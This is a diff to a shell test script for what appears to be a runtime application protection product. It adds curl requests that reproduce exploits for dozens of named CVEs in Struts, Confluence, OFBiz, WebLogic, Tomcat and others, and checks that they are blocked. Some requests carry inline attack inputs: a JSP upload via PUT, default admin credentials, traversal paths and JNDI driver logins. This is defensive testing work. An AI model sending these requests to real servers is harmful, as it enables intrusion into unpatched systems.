   expect_not_blocked "$version" baseline_nexus_cve_2020_10199_go_group_el "${baseline_url}/rasp/policy/request-nexus-go-group-el-expression"
   expect_not_blocked "$version" baseline_nexus_extdirect_jexl_expression "${baseline_url}/rasp/policy/request-nexus-extdirect-jexl-expression"
@@ -534,28 +947,38 @@ SOAP
   expect_not_blocked "$version" baseline_spring_cve_2017_8046_json_patch_spel -X PATCH -H "Content-Type: application/json-patch+json" --data-binary "$spring_cve_2017_8046_body" "${baseline_url}/customers/1"
   expect_not_blocked "$version" baseline_expression_parameter_name "${baseline_url}/rasp/policy/request-expression-parameter-name"
   expect_not_blocked "$version" baseline_spring_cve_2018_1273_data_commons_binding_spel -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "${spring_cve_2018_1273_field}=&password=&repeatedPassword=" "${baseline_url}/users?page=&size=5"
+  expect_not_blocked "$version" baseline_struts2_s2003_eval_parameter_name "${baseline_url}/example/HelloWorld.action?${struts2_s2005_eval_query}"
   expect_not_blocked "$version" baseline_struts2_s2005_eval_parameter_name "${baseline_url}/example/HelloWorld.action?${struts2_s2005_eval_query}"
   expect_not_blocked "$version" baseline_struts2_s2016_redirect_parameter_name "${baseline_url}/index.action?${struts2_s2016_redirect_query}"
   expect_not_blocked "$version" baseline_struts2_s2032_method_parameter_name "${baseline_url}/index.action?${struts2_s2032_method_query}"
+  expect_not_blocked "$version" baseline_struts2_cve_2016_3081_s2032_method_parameter_name "${baseline_url}/index.action?${struts2_s2032_method_query}"
   expect_not_blocked "$version" baseline_spring_binding_expression_name "${baseline_url}/rasp/policy/request-spring-binding-expression-name"
   expect_not_blocked "$version" baseline_spring_cve_2017_4971_webflow_binding_spel -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "${spring_cve_2017_4971_field}=vulhub" "${baseline_url}/hotels/booking"
   expect_not_blocked "$version" baseline_expression_path "${baseline_url}/rasp/policy/request-expression-path"
   expect_not_blocked "$version" baseline_confluence_cve_2022_26134_path_ognl -G --data-urlencode "uri=${confluence_cve_2022_26134_path}" "${baseline_url}/rasp/policy/request-expression-path"
+  expect_not_blocked "$version" baseline_confluence_cve_2022_26134_direct_path_ognl --path-as-is "${baseline_url}${confluence_cve_2022_26134_path}"
+  expect_not_blocked "$version" baseline_struts2_s2015_action_path --path-as-is "${baseline_url}${struts2_s2015_action_path}"
   expect_not_blocked "$version" baseline_struts2_s2057_namespace_path --path-as-is "${baseline_url}${struts2_s2057_namespace_path}"
+  expect_not_blocked "$version" baseline_struts2_cve_2018_11776_s2057_namespace_path --path-as-is "${baseline_url}${struts2_s2057_namespace_path}"
   expect_not_blocked "$version" baseline_xxe_payload "${baseline_url}/rasp/policy/request-xxe-payload"
   expect_not_blocked "$version" baseline_solr_cve_2017_12629_xmlparser_xxe "${baseline_url}/rasp/policy/request-solr-cve-2017-12629-xxe"
   expect_not_blocked "$version" baseline_typed_parameter_deserialization "${baseline_url}/rasp/policy/request-typed-parameter-deserialization"
   expect_not_blocked "$version" baseline_liferay_jsonws_typed_parameter -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$liferay_jsonws_body" "${baseline_url}/api/jsonws/invoke"
   expect_not_blocked "$version" baseline_typed_payload_deserialization "${baseline_url}/rasp/policy/request-typed-payload-deserialization"
+  expect_not_blocked "$version" baseline_coldfusion_cve_2023_29300_wddx_argumentcollection -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$coldfusion_wddx_argumentcollection_body" "${baseline_url}/CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true"
   expect_not_blocked "$version" baseline_hertzbeat_cve_2024_42323_yaml_import "${baseline_url}/rasp/policy/request-hertzbeat-cve-2024-42323-yaml-import"
   expect_not_blocked "$version" baseline_xml_polymorphic_gadget "${baseline_url}/rasp/policy/request-xml-polymorphic-gadget"
+  expect_not_blocked "$version" baseline_struts2_s2052_xml_polymorphic_gadget -X POST -H "Content-Type: application/xml" --data-binary "$struts2_s2052_xml_body" "${baseline_url}/orders/3/edit"
   expect_not_blocked "$version" baseline_xstream_jndi_xml_gadget "${baseline_url}/rasp/policy/request-xstream-jndi-xml-gadget"
+  expect_not_blocked "$version" baseline_xstream_cve_2021_21351_jdbcrowset_jndi_xml_gadget "${baseline_url}/rasp/policy/request-xstream-jndi-xml-gadget"
   expect_not_blocked "$version" baseline_xstream_rmi_xml_gadget "${baseline_url}/rasp/policy/request-xstream-rmi-xml-gadget"
+  expect_not_blocked "$version" baseline_xstream_cve_2021_29505_registryimpl_rmi_xml_gadget "${baseline_url}/rasp/policy/request-xstream-rmi-xml-gadget"
   expect_not_blocked "$version" baseline_template_parameter "${baseline_url}/rasp/policy/request-template-parameter"
   expect_not_blocked "$version" baseline_template_loader_enable "${baseline_url}/rasp/policy/request-template-loader-enable"
   expect_not_blocked "$version" baseline_solr_cve_2019_17558_velocity_template "${baseline_url}/rasp/policy/request-solr-cve-2019-17558-velocity-template"
   expect_not_blocked "$version" baseline_solr_cve_2019_17558_template_loader_enable "${baseline_url}/rasp/policy/request-solr-cve-2019-17558-template-loader-enable"
   expect_not_blocked "$version" baseline_jira_contact_template "${baseline_url}/rasp/policy/request-jira-contact-template"
+  expect_not_blocked "$version" baseline_jira_cve_2019_11581_contact_template -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "from=test@test.com" --data-urlencode "subject=${jira_contact_template}" --data-urlencode "details=v" --data-urlencode "atl_token=token" "${baseline_url}/secure/ContactAdministrators.jspa"
   expect_not_blocked "$version" baseline_template_json_parameter "${baseline_url}/rasp/policy/request-template-json-parameter"
   expect_not_blocked "$version" baseline_jmreport_freemarker_sql -X POST -H "Content-Type: application/json" --data-binary "$jmreport_freemarker_body" "${baseline_url}/jmreport/queryFieldBySql"
   expect_not_blocked "$version" baseline_template_source "${baseline_url}/rasp/policy/request-template-source"
@@ -573,8 +996,11 @@ SOAP
   expect_not_blocked "$version" baseline_opentsdb_cve_2020_35476_yrange_plot_command "${baseline_url}/rasp/policy/request-plot-command-injection"
   expect_not_blocked "$version" baseline_opentsdb_cve_2023_25826_key_plot_command "${baseline_url}/rasp/policy/request-opentsdb-key-plot-command-injection"
   expect_not_blocked "$version" baseline_sql_sort_injection "${baseline_url}/rasp/policy/request-sql-sort-injection"
+  expect_not_blocked "$version" baseline_metersphere_cve_2021_45788_case_sort_sqli -X POST -H "Content-Type: application/json" --data-binary "$metersphere_case_sort_body" "${baseline_url}/test/case/list/1/10"
   expect_not_blocked "$version" baseline_sql_identifier_injection "${baseline_url}/rasp/policy/request-skywalking-graphql-sql-identifier"
+  expect_not_blocked "$version" baseline_skywalking_8_3_0_graphql_metricname_sqli -X POST -H "Content-Type: application/json" --data-binary "$skywalking_graphql_body" "${baseline_url}/graphql"
   expect_not_blocked "$version" baseline_remote_job_submission "${baseline_url}/rasp/policy/remote-job-submission"
+  expect_not_blocked "$version" baseline_spark_unacc_rest_submission -X POST -H "Content-Type: application/json" --data-binary "$spark_rest_submission_body" "${baseline_url}/v1/submissions/create"
   expect_not_blocked "$version" baseline_hadoop_yarn_command_submission "${baseline_url}/rasp/policy/remote-hadoop-yarn-command-submission"
   expect_not_blocked "$version" baseline_teamcity_cve_2024_27198_internal_forward "${baseline_url}/rasp/policy/request-internal-forward"
   expect_not_blocked "$version" baseline_dataease_geo_whitelist_traversal --path-as-is "${baseline_url}/geo/../dataease/de2api/datasource/types"
@@ -586,42 +1012,72 @@ SOAP
   expect_block "$version" request_nacos_cve_2021_29441_list_users -H "User-Agent: Nacos-Server" "${protected_url}/nacos/v1/auth/users?pageNo=1&pageSize=9"
   expect_block "$version" request_nacos_cve_2021_29441_create_user -X POST -H "User-Agent: Nacos-Server" "${protected_url}/nacos/v1/auth/users?username=vulhub&password=vulhub"
   expect_block "$version" request_default_jwt_secret "${protected_url}/rasp/policy/request-default-jwt-secret"
+  expect_block "$version" request_hugegraph_cve_2024_43441_default_jwt_secret -H "Authorization: Bearer ${hugegraph_default_jwt}" "${protected_url}/graphs"
   expect_block "$version" request_jwt_verification_failure "${protected_url}/rasp/policy/request-jwt-verification-failure"
+  expect_block "$version" request_dataease_cve_2025_49001_user_info_invalid_jwt -H "X-DE-TOKEN: ${dataease_cve_2025_49001_jwt}" "${protected_url}/de2api/user/info"
   expect_block "$version" request_default_crypto_cookie "${protected_url}/rasp/policy/request-default-crypto-cookie"
   expect_block_redirect "$version" request_shiro_cve_2016_4437_default_rememberme -H "Cookie: ${shiro_default_rememberme_cookie}" "${protected_url}/"
   expect_block "$version" request_serialized_client_state "${protected_url}/rasp/policy/request-serialized-client-state"
+  expect_block "$version" request_mojarra_jsf_viewstate_deserialization -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "javax.faces.ViewState=${jsf_viewstate_payload}&submit=Login" "${protected_url}/index.xhtml"
   expect_block "$version" request_default_credential "${protected_url}/rasp/policy/request-default-credential"
+  expect_block "$version" request_tomcat8_manager_default_credential -u "tomcat:tomcat" "${protected_url}/manager/html"
+  expect_block "$version" request_weblogic_weak_password_console_login -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "j_username=weblogic&j_password=Oracle%40123" "${protected_url}/console/j_security_check"
   expect_block "$version" request_empty_credential_bypass "${protected_url}/rasp/policy/request-empty-credential-bypass"
   expect_block "$version" request_setup_state_reset "${protected_url}/rasp/policy/request-setup-state-reset"
   expect_block "$version" request_server_side_script_put "${protected_url}/rasp/policy/request-server-side-script-put"
+  expect_block "$version" request_tomcat_cve_2017_12615_server_side_script_put -X PUT --data-binary "<% out.println(1); %>" "${protected_url}/1.jsp/"
   expect_block "$version" request_upload_filename_override "${protected_url}/rasp/policy/request-upload-filename-override"
+  expect_block "$version" request_struts2_s2066_upload_filename_override -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2066_boundary}" --data-binary "@${struts2_s2066_body_file}" "${protected_url}/index.action"
+  expect_block "$version" request_struts2_cve_2023_50164_s2066_upload_filename_override -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2066_boundary}" --data-binary "@${struts2_s2066_body_file}" "${protected_url}/index.action"
+  expect_block "$version" request_struts2_s2067_upload_filename_override -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2067_boundary}" --data-binary "@${struts2_s2067_body_file}" "${protected_url}/index.action"
+  expect_block "$version" request_struts2_cve_2024_53677_s2067_upload_filename_override -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2067_boundary}" --data-binary "@${struts2_s2067_body_file}" "${protected_url}/index.action"
   expect_block "$version" request_scheduler_shell_job "${protected_url}/rasp/policy/request-scheduler-shell-job"
+  expect_block "$version" request_xxl_job_executor_run_shell -X POST -H "Content-Type: application/json" --data-binary "$xxl_job_run_body" "${protected_url}/run"
   expect_block "$version" request_debug_process_launch "${protected_url}/rasp/policy/request-debug-process-launch"
+  expect_block "$version" request_teamcity_cve_2023_42793_debug_process_launch "${protected_url}/rasp/policy/request-debug-process-launch"
   expect_block "$version" request_dynamic_script_config "${protected_url}/rasp/policy/request-dynamic-script-config"
   expect_block "$version" request_spring_cve_2022_22947_gateway_route_spel -X POST -H "Content-Type: application/json" --data-binary "$spring_cve_2022_22947_body" "${protected_url}/actuator/gateway/routes/hacktest"
   expect_block "$version" request_solr_cve_2019_0193_dataimport_script "${protected_url}/rasp/policy/request-solr-cve-2019-0193-dataimport-script"
   expect_block "$version" request_elasticsearch_cve_2014_3120_mvel_search_script "${protected_url}/rasp/policy/request-elasticsearch-cve-2014-3120-search-script"
   expect_block "$version" request_elasticsearch_cve_2015_1427_groovy_search_script "${protected_url}/rasp/policy/request-elasticsearch-cve-2015-1427-search-script"
   expect_block "$version" request_message_selector_expression "${protected_url}/rasp/policy/request-spring-messaging-stomp-selector"
+  expect_block "$version" request_spring_cve_2018_1270_stomp_selector -X POST -H "Content-Type: application/json" --data-binary "$spring_cve_2018_1270_stomp_body" "${protected_url}/gs-guide-websocket/123/abc/xhr_send"
   expect_block "$version" request_dynamic_script_config "${protected_url}/rasp/policy/request-druid-javascript-sampler"
+  expect_block "$version" request_druid_cve_2021_25646_javascript_sampler -X POST -H "Content-Type: application/json" --data-binary "$druid_javascript_sampler_body" "${protected_url}/druid/indexer/v1/sampler"
   expect_block "$version" request_hugegraph_gremlin_script "${protected_url}/rasp/policy/request-hugegraph-gremlin-script"
+  expect_block "$version" request_hugegraph_cve_2024_27348_gremlin_rce -X POST -H "Content-Type: application/json" --data-binary "$hugegraph_gremlin_body" "${protected_url}/gremlin"
   expect_block "$version" request_ofbiz_groovy_programexport "${protected_url}/rasp/policy/request-ofbiz-groovy-programexport"
+  expect_block "$version" request_ofbiz_cve_2023_51467_programexport -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "groovyProgram=${ofbiz_groovy_program}" "${protected_url}/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
+  expect_block "$version" request_ofbiz_cve_2024_38856_programexport -X POST --form-string "groovyProgram=${ofbiz_groovy_program_unicode}" "${protected_url}/webtools/control/main/ProgramExport"
+  expect_block "$version" request_ofbiz_cve_2024_32113_viewdatafile_remote_import -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$ofbiz_viewdatafile_body" "${protected_url}/webtools/control/forgotPassword/viewdatafile"
+  expect_block "$version" request_ofbiz_cve_2024_36104_viewdatafile_remote_import -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$ofbiz_viewdatafile_body" "${protected_url}/webtools/control/forgotPassword/viewdatafile"
+  expect_block "$version" request_ofbiz_cve_2024_45195_viewdatafile_remote_import -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$ofbiz_viewdatafile_body" "${protected_url}/webtools/control/forgotPassword/viewdatafile"
   expect_block "$version" request_jenkins_groovy_checkscript "${protected_url}/rasp/policy/request-jenkins-groovy-checkscript"
+  expect_block "$version" request_jenkins_cve_2018_1000861_checkscript -G --data-urlencode "sandbox=true" --data-urlencode "value=${jenkins_checkscript_value}" "${protected_url}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript"
   expect_block "$version" request_dynamic_script_json_config "${protected_url}/rasp/policy/request-dynamic-script-json-config"
+  expect_block "$version" request_aj_report_cnvd_2024_15077_validation_rules -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$aj_report_validation_rules_body" "${protected_url}/dataSetParam/verification;swagger-ui/"
   expect_block "$version" request_unomi_context_expression "${protected_url}/rasp/policy/request-unomi-context-expression"
+  expect_block "$version" request_unomi_cve_2020_13942_context_mvel -X POST -H "Content-Type: application/json" --data-binary "$unomi_context_mvel_body" "${protected_url}/context.json"
   expect_block "$version" request_metabase_h2_init_config "${protected_url}/rasp/policy/request-metabase-h2-init-config"
+  expect_block "$version" request_metabase_cve_2023_38646_setup_validate -X POST -H "Content-Type: application/json" --data-binary "$metabase_setup_validate_body" "${protected_url}/api/setup/validate"
   expect_block "$version" request_dynamic_script_config "${protected_url}/rasp/policy/request-h2-console-jdbc-init"
   expect_block "$version" request_h2_console_login_jdbc_init -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "driver=org.h2.Driver" --data-urlencode "url=${h2_console_login_jdbc_url}" "${protected_url}/h2-console/login.do"
   expect_block "$version" request_dynamic_script_config "${protected_url}/rasp/policy/request-weblogic-console-shellsession"
+  expect_block "$version" request_weblogic_cve_2020_14882_console_shellsession --path-as-is -G --data-urlencode "_nfpb=true" --data-urlencode "_pageLabel=" --data-urlencode "handle=${weblogic_console_handle}" "${protected_url}/console/css/%252e%252e%252fconsole.portal"
+  expect_block "$version" request_weblogic_cve_2020_14883_console_shellsession --path-as-is -G --data-urlencode "_nfpb=true" --data-urlencode "_pageLabel=" --data-urlencode "handle=${weblogic_console_handle}" "${protected_url}/console/css/%252e%252e%252fconsole.portal"
+  expect_block "$version" request_weblogic_cve_2019_2725_console_filesystemxml --path-as-is -G --data-urlencode "_nfpb=true" --data-urlencode "_pageLabel=" --data-urlencode "handle=${weblogic_console_filesystemxml_handle}" "${protected_url}/console/css/%252e%252e%252fconsole.portal"
   expect_block "$version" request_dataease_h2_datasource_config "${protected_url}/rasp/policy/request-dataease-h2-datasource-config"
+  expect_block "$version" request_dataease_cve_2025_32966_h2_datasource_validate -X POST -H "Content-Type: application/json" -H "X-DE-TOKEN: ${dataease_forged_jwt}" --data-binary "$dataease_h2_datasource_validate_body" "${protected_url}/de2api/datasource/validate"
   expect_block "$version" request_expression_header "${protected_url}/rasp/policy/request-expression-header"
   expect_block "$version" request_spring_cve_2022_22963_functionrouter_spel -X POST -H "Content-Type: text/plain" -H "spring.cloud.function.routing-expression: ${spring_cve_2022_22963_expression}" --data-binary "test" "${protected_url}/functionRouter"
   expect_block "$version" request_expression_header_content_type "${protected_url}/rasp/policy/request-expression-content-type"
   expect_block_redirect "$version" request_struts2_s2045_content_type -X POST -H "Content-Type: ${struts2_s2045_content_type}" "${protected_url}/index.action"
+  expect_block_redirect "$version" request_struts2_cve_2017_5638_s2045_content_type -X POST -H "Content-Type: ${struts2_s2045_content_type}" "${protected_url}/index.action"
   expect_block "$version" request_jndi_lookup "${protected_url}/rasp/policy/request-jndi-lookup"
   expect_block "$version" request_log4j_cve_2021_44228_solr_admin_cores -G --data-urlencode "action=${log4shell_jndi_payload}" "${protected_url}/solr/admin/cores"
   expect_block "$version" request_jndi_lookup "${protected_url}/rasp/policy/request-h2-console-jndi-driver"
   expect_block "$version" request_h2_console_login_jndi_driver -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "driver=javax.naming.InitialContext" --data-urlencode "url=${h2_console_jndi_url}" "${protected_url}/h2-console/login.do"
+  expect_block "$version" request_h2_cve_2021_42392_console_jndi_driver -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "driver=javax.naming.InitialContext" --data-urlencode "url=${h2_console_jndi_url}" "${protected_url}/h2-console/login.do"
   expect_block "$version" request_expression_parameter "${protected_url}/rasp/policy/request-expression-parameter"
   expect_block "$version" request_struts2_s2001_form_ognl -X POST --data-urlencode "username=${struts2_ognl_runtime_payload}" "${protected_url}/login.action"
   expect_block "$version" request_struts2_s2007_validation_ognl -X POST --data-urlencode "age=${struts2_ognl_runtime_payload}" "${protected_url}/user.action"
@@ -629,19 +1085,30 @@ SOAP
   expect_block "$version" request_struts2_s2009_delegated_ognl -G --data-urlencode "age=12313" --data-urlencode "name=${struts2_ognl_runtime_payload}" "${protected_url}/ajax/example5.action"
   expect_block "$version" request_struts2_s2012_redirect_value -G --data-urlencode "name=${struts2_ognl_runtime_payload}" "${protected_url}/user.action"
   expect_block "$version" request_struts2_s2013_link_includeparams -G --data-urlencode "a=${struts2_dollar_ognl_runtime_payload}" "${protected_url}/link.action"
+  expect_block "$version" request_struts2_s2014_dollar_ognl_includeparams -G --data-urlencode "a=${struts2_dollar_ognl_runtime_payload}" "${protected_url}/link.action"
   expect_block "$version" request_struts2_s2048_showcase_value -X POST --data-urlencode "name=${struts2_ognl_runtime_payload}" "${protected_url}/integration/saveGangster.action"
   expect_block "$version" request_struts2_s2053_freemarker_value -X POST --data-urlencode "name=${struts2_ognl_runtime_payload}" "${protected_url}/index.action"
   expect_block "$version" request_struts2_s2059_forced_ognl -X POST --data-urlencode "id=${struts2_ognl_runtime_payload}" "${protected_url}/index.action"
+  expect_block "$version" request_struts2_cve_2019_0230_s2059_forced_ognl -X POST --data-urlencode "id=${struts2_ognl_runtime_payload}" "${protected_url}/index.action"
   expect_block "$version" request_struts2_s2061_freemarker_execute -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2061_boundary}" --data-binary "@${struts2_s2061_body_file}" "${protected_url}/index.action"
+  expect_block "$version" request_struts2_cve_2020_17530_s2061_freemarker_execute -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2061_boundary}" --data-binary "@${struts2_s2061_body_file}" "${protected_url}/index.action"
   expect_block "$version" request_geoserver_wfs_valuereference "${protected_url}/rasp/policy/request-geoserver-wfs-valuereference"
+  expect_block "$version" request_geoserver_cve_2022_41852_wfs_valuereference_get "${protected_url}/rasp/policy/request-geoserver-wfs-valuereference"
   expect_block "$version" request_geoserver_cve_2024_36401_wfs_valuereference_get "${protected_url}/rasp/policy/request-geoserver-wfs-valuereference"
+  expect_block "$version" request_geoserver_cve_2022_41852_wfs_valuereference_xml "${protected_url}/rasp/policy/request-geoserver-wfs-valuereference-xml"
   expect_block "$version" request_geoserver_cve_2024_36401_wfs_valuereference_xml "${protected_url}/rasp/policy/request-geoserver-wfs-valuereference-xml"
   expect_block "$version" request_geoserver_cql_filter_sqli "${protected_url}/rasp/policy/request-geoserver-cql-filter-sqli"
   expect_block "$version" request_geoserver_cve_2023_25157_cql_filter_sqli "${protected_url}/rasp/policy/request-geoserver-cql-filter-sqli"
+  expect_block "$version" request_geoserver_cve_2023_25158_cql_filter_sqli "${protected_url}/rasp/policy/request-geoserver-cql-filter-sqli"
   expect_block "$version" request_confluence_delegated_expression "${protected_url}/rasp/policy/request-confluence-delegated-expression"
+  expect_block "$version" request_confluence_cve_2019_3396_macro_template_source -X POST -H "Content-Type: application/json; charset=utf-8" --data-binary "$confluence_cve_2019_3396_macro_body" "${protected_url}/rest/tinymce/1/macro/preview"
   expect_block "$version" request_confluence_cve_2021_26084_webwork_querystring -G --data-urlencode "uri=/pages/doenterpagevariables.action" --data-urlencode "parameter=queryString" --data-urlencode "value=${confluence_cve_2021_26084_query_string}" "${protected_url}/rasp/policy/request-expression-parameter"
+  expect_block "$version" request_confluence_cve_2021_26084_doenterpagevariables -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "queryString=${confluence_cve_2021_26084_query_string}" "${protected_url}/pages/doenterpagevariables.action"
   expect_block "$version" request_confluence_cve_2023_22527_delegated_expression "${protected_url}/rasp/policy/request-confluence-delegated-expression"
+  expect_block "$version" request_confluence_cve_2023_22515_setup_reset "${protected_url}/server-info.action?${confluence_cve_2023_22515_setup_query}"
+  expect_block "$version" request_confluence_cve_2023_22527_text_inline_delegated_expression -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$confluence_cve_2023_22527_body" "${protected_url}/template/aui/text-inline.vm"
   expect_block "$version" request_expression_json_parameter "${protected_url}/rasp/policy/request-expression-json-parameter"
+  expect_block "$version" request_nexus_cve_2018_16621_extdirect_role_el "${protected_url}/rasp/policy/request-expression-json-parameter"
   expect_block "$version" request_nexus_cve_2020_10204_extdirect_role_el "${protected_url}/rasp/policy/request-expression-json-parameter"
   expect_block "$version" request_nexus_cve_2020_10199_go_group_el "${protected_url}/rasp/policy/request-nexus-go-group-el-expression"
   expect_block "$version" request_nexus_extdirect_jexl_expression "${protected_url}/rasp/policy/request-nexus-extdirect-jexl-expression"
@@ -652,28 +1119,38 @@ SOAP
   expect_block "$version" request_spring_cve_2017_8046_json_patch_spel -X PATCH -H "Content-Type: application/json-patch+json" --data-binary "$spring_cve_2017_8046_body" "${protected_url}/customers/1"
   expect_block "$version" request_expression_parameter_name "${protected_url}/rasp/policy/request-expression-parameter-name"
   expect_block "$version" request_spring_cve_2018_1273_data_commons_binding_spel -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "${spring_cve_2018_1273_field}=&password=&repeatedPassword=" "${protected_url}/users?page=&size=5"
+  expect_block "$version" request_struts2_s2003_eval_parameter_name "${protected_url}/example/HelloWorld.action?${struts2_s2005_eval_query}"
   expect_block "$version" request_struts2_s2005_eval_parameter_name "${protected_url}/example/HelloWorld.action?${struts2_s2005_eval_query}"
   expect_block "$version" request_struts2_s2016_redirect_parameter_name "${protected_url}/index.action?${struts2_s2016_redirect_query}"
   expect_block "$version" request_struts2_s2032_method_parameter_name "${protected_url}/index.action?${struts2_s2032_method_query}"
+  expect_block "$version" request_struts2_cve_2016_3081_s2032_method_parameter_name "${protected_url}/index.action?${struts2_s2032_method_query}"
   expect_block "$version" request_spring_binding_expression_name "${protected_url}/rasp/policy/request-spring-binding-expression-name"
   expect_block "$version" request_spring_cve_2017_4971_webflow_binding_spel -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "${spring_cve_2017_4971_field}=vulhub" "${protected_url}/hotels/booking"
   expect_block "$version" request_expression_path "${protected_url}/rasp/policy/request-expression-path"
   expect_block "$version" request_confluence_cve_2022_26134_path_ognl -G --data-urlencode "uri=${confluence_cve_2022_26134_path}" "${protected_url}/rasp/policy/request-expression-path"
+  expect_block "$version" request_confluence_cve_2022_26134_direct_path_ognl --path-as-is "${protected_url}${confluence_cve_2022_26134_path}"
+  expect_block "$version" request_struts2_s2015_action_path --path-as-is "${protected_url}${struts2_s2015_action_path}"
   expect_block "$version" request_struts2_s2057_namespace_path --path-as-is "${protected_url}${struts2_s2057_namespace_path}"
+  expect_block "$version" request_struts2_cve_2018_11776_s2057_namespace_path --path-as-is "${protected_url}${struts2_s2057_namespace_path}"
   expect_block "$version" request_xxe_payload "${protected_url}/rasp/policy/request-xxe-payload"
   expect_block "$version" request_solr_cve_2017_12629_xmlparser_xxe "${protected_url}/rasp/policy/request-solr-cve-2017-12629-xxe"
   expect_block "$version" request_typed_parameter_deserialization "${protected_url}/rasp/policy/request-typed-parameter-deserialization"
   expect_block "$version" request_liferay_jsonws_typed_parameter -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$liferay_jsonws_body" "${protected_url}/api/jsonws/invoke"
   expect_block "$version" request_typed_payload_deserialization "${protected_url}/rasp/policy/request-typed-payload-deserialization"
+  expect_block "$version" request_coldfusion_cve_2023_29300_wddx_argumentcollection -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$coldfusion_wddx_argumentcollection_body" "${protected_url}/CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true"
   expect_block "$version" request_hertzbeat_cve_2024_42323_yaml_import "${protected_url}/rasp/policy/request-hertzbeat-cve-2024-42323-yaml-import"
   expect_block "$version" request_xml_polymorphic_gadget "${protected_url}/rasp/policy/request-xml-polymorphic-gadget"
+  expect_block "$version" request_struts2_s2052_xml_polymorphic_gadget -X POST -H "Content-Type: application/xml" --data-binary "$struts2_s2052_xml_body" "${protected_url}/orders/3/edit"
   expect_block "$version" request_xstream_jndi_xml_gadget "${protected_url}/rasp/policy/request-xstream-jndi-xml-gadget"
+  expect_block "$version" request_xstream_cve_2021_21351_jdbcrowset_jndi_xml_gadget "${protected_url}/rasp/policy/request-xstream-jndi-xml-gadget"
   expect_block "$version" request_xstream_rmi_xml_gadget "${protected_url}/rasp/policy/request-xstream-rmi-xml-gadget"
+  expect_block "$version" request_xstream_cve_2021_29505_registryimpl_rmi_xml_gadget "${protected_url}/rasp/policy/request-xstream-rmi-xml-gadget"
   expect_block "$version" request_template_parameter "${protected_url}/rasp/policy/request-template-parameter"
   expect_block "$version" request_template_loader_enable "${protected_url}/rasp/policy/request-template-loader-enable"
   expect_block "$version" request_solr_cve_2019_17558_velocity_template "${protected_url}/rasp/policy/request-solr-cve-2019-17558-velocity-template"
   expect_block "$version" request_solr_cve_2019_17558_template_loader_enable "${protected_url}/rasp/policy/request-solr-cve-2019-17558-template-loader-enable"
   expect_block "$version" request_jira_contact_template "${protected_url}/rasp/policy/request-jira-contact-template"
+  expect_block "$version" request_jira_cve_2019_11581_contact_template -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "from=test@test.com" --data-urlencode "subject=${jira_contact_template}" --data-urlencode "details=v" --data-urlencode "atl_token=token" "${protected_url}/secure/ContactAdministrators.jspa"
   expect_block "$version" request_template_json_parameter "${protected_url}/rasp/policy/request-template-json-parameter"
   expect_block "$version" request_jmreport_freemarker_sql -X POST -H "Content-Type: application/json" --data-binary "$jmreport_freemarker_body" "${protected_url}/jmreport/queryFieldBySql"
   expect_block "$version" request_template_source "${protected_url}/rasp/policy/request-template-source"
@@ -682,6 +1159,7 @@ SOAP
   expect_block "$version" request_template_source "${protected_url}/rasp/policy/request-locale-source-traversal"
   expect_block "$version" request_coldfusion_locale_source_traversal "${protected_url}/CFIDE/administrator/enter.cfm?locale=${coldfusion_locale_query}"
   expect_block "$version" request_template_source "${protected_url}/rasp/policy/request-ofbiz-remote-decorator-source"
+  expect_block "$version" request_ofbiz_cve_2024_45507_remote_decorator_source -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "statsDecoratorLocation=${ofbiz_remote_decorator_url}" "${protected_url}/webtools/control/forgotPassword/StatsSinceStart"
   expect_block "$version" request_remote_content_stream "${protected_url}/rasp/policy/request-remote-content-stream"
   expect_block "$version" request_solr_remotestreaming_config_enable "${protected_url}/rasp/policy/request-solr-remotestreaming-config-enable"
   expect_block "$version" request_solr_remotestreaming_file_read "${protected_url}/rasp/policy/request-solr-remotestreaming-file-read"
@@ -692,8 +1170,11 @@ SOAP
   expect_block "$version" request_opentsdb_cve_2020_35476_yrange_plot_command "${protected_url}/rasp/policy/request-plot-command-injection"
   expect_block "$version" request_opentsdb_cve_2023_25826_key_plot_command "${protected_url}/rasp/policy/request-opentsdb-key-plot-command-injection"
   expect_block "$version" request_sql_sort_injection "${protected_url}/rasp/policy/request-sql-sort-injection"
+  expect_block "$version" request_metersphere_cve_2021_45788_case_sort_sqli -X POST -H "Content-Type: application/json" --data-binary "$metersphere_case_sort_body" "${protected_url}/test/case/list/1/10"
   expect_block "$version" request_sql_identifier_injection "${protected_url}/rasp/policy/request-skywalking-graphql-sql-identifier"
+  expect_block "$version" request_skywalking_8_3_0_graphql_metricname_sqli -X POST -H "Content-Type: application/json" --data-binary "$skywalking_graphql_body" "${protected_url}/graphql"
   expect_block "$version" request_remote_job_submission "${protected_url}/rasp/policy/remote-job-submission"
